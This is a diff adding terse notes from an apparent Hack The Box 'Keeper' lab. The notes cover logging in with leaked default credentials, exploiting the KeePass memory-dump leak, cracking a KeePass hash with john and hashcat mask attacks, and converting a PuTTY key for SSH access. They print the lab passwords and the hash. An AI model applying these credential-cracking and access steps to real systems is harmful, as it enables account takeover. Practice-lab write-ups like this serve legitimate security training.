@@ -1,0 +1,88 @@
+
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+4.4.4+dfsg-2ubuntu1  
+RT 4.4.4+dfsg-2ubuntu1 (Debian)
+
+Lise
+lnorgaard@keeper.htb
+lNørgaard
+I have saved the file to my home directory and removed the attachment for security reasons.
+Once my investigation of the crash dump is complete, I will let you know. 
+
+
+ssh lnorgaard@10.10.11.227
+
+Welcome2023!
+
+
+
+------------------------------------------------------------------------------------------------------------
+
+ref: https://github.com/vdohney/keepass-password-dumper
+ref: https://www.linkedin.com/pulse/steal-keepass-2x-254-master-password-chance-johnson
+
+keepass2john file.kdbx > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+
+Possible password: ●,dgr●d med fl●de
+Possible password: ●ldgr●d med fl●de
+Possible password: ●`dgr●d med fl●de
+Possible password: ●-dgr●d med fl●de
+Possible password: ●'dgr●d med fl●de
+Possible password: ●]dgr●d med fl●de
+Possible password: ●Adgr●d med fl●de
+Possible password: ●Idgr●d med fl●de
+Possible password: ●:dgr●d med fl●de
+Possible password: ●=dgr●d med fl●de
+Possible password: ●_dgr●d med fl●de
+Possible password: ●cdgr●d med fl●de
+Possible password: ●Mdgr●d med fl●de
+
+dgr<{d, e}> med flde
+
+●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
+●ødgrød med fløde
+Idgrd med flde
+
+$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
+
+hashcat -m 13400 hash -a 3 -1 ?a "?a?adgr?ad med flalde" -O --force
+hashcat -m 13400 hash -a 3 -1 ?b "?bødgrød med fløde" -O --force
+
+
+hashcat -m 13400 hash -a 3 -1 ?b  -2 charset "?1?2dgrød med fløde" -O --force
+
+ref: https://hashcat.net/wiki/doku.php?id=mask_attack#custom_charsets
+
+
+rødgrød med fløde
+
+rødgrød med fløde
+
+F4><3K0nd!
+
+https://www.baeldung.com/linux/ssh-key-types-convert-ppk
+
+puttygen putty.ppk -O public -o pp_id_rsa.pub
+
+
+login using putty key :https://my.justhost.com/cgi/help/putty
+
+------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------
